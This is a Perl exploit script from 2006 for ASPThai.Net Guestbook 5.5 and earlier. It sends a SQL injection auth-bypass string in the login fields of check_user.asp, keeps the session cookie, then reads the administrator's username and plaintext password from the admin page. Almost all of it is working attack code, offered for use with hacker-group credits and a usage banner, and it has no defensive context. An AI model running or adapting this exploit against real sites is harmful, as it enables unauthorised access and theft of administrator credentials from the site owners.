ASPThai.Net Guestbook <= 5.5 (Auth Bypass) SQL Injection Exploit
================================================================





#!/usr/bin/perl
# SQL Injection Exploit for ASPThai.Net Guestbook <= 5.5  
#(And possible higher could not find a site to test it on)
# This exploit shows the username of the administrator and the password In plain text
# Bug Found by muderskillz Coded by Zodiac
# Shouts to cijfer,uid0,|n|ex,ph4tel,z3r0,lethal, Felosi,seven,Spic and anyone else I forgot.
# http://exploitercode.com/ http://www.g00ns.net 
#irc.g00ns.net #g00ns  email = zodiac@g00ns.net
#(c) 2006

use LWP::UserAgent;
use HTTP::Cookies;

$Server = $ARGV[0];

if($Server =~m/http/g)
{
$Server=~ &#039;http://$Server&#039;;
print 
}
else {
  print $error;
}

if(!$Server) {usage();exit() ;}

head();

print "\r\nGrabbing Username And Password\r\n\n";

#Login&#039;s and stores a cookie to view admin panel later


 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->agent(&#039;g00ns&#039;);
 $xpl->cookie_jar($cookie_jar);

 $res = $xpl->post(
 $Server.&#039;check_user.asp&#039;,
 Content => [ 

	&#039;txtUserName&#039; => &#039;\&#039; or \&#039;%67%30%30%6e%73\&#039;=\&#039;%67%30%30%6e%73&#039;, 
	&#039;txtUserPass&#039; => &#039;\&#039; or \&#039;%67%30%30%6e%73\&#039;=\&#039;%67%30%30%6e%73&#039;,
	&#039;Submit&#039; => &#039;-= Login =-&#039;,
 ],
 );

# Create a request
my $req = HTTP::Request->new(GET => 

$Server.&#039;change_admin_username.asp&#039;

);

$req->header(&#039;Referer&#039;, $Server.&#039;admin_menu.asp&#039;);

my $res = $xpl->request($req);

$info= $res->content;

if($info =~ m/Unauthorised\sAccess|The\spage\scannot\sbe\sfound/) 
{ 
 die "Error Connecting...\r\n"; 
}

#Check the outcome of the response

$info=~m/(value=\")(\n+|\w+|\W+)/g;
$User = $2;
$info=~m/(value=\")(\n+|\w+|\W+)/g;
$Pass= $2;

print "UserName:$User\r\nPassword:$Pass\r\n";

sub head()
 {
 print "\n=======================================================================\r\n";
 print "* ASPThai.Net Guestbook version 5.5 SQL Injection by www.g00ns.net *\r\n";   
 print "=======================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: Thaisql.pl <Site>  \r\n\n";
 print " <Site> - Full path to Guestbook e.g. http://www.site.com/guestbook/ \r\n";
 print "=======================================================================\r\n";
 print "   -=Coded by Zodiac, Bug Found by MurderSkillz=-\r\n";
 print "www.exploitercode.com www.g00ns.net irc.g00ns.net #g00ns\r\n";
 print "=======================================================================\r\n";



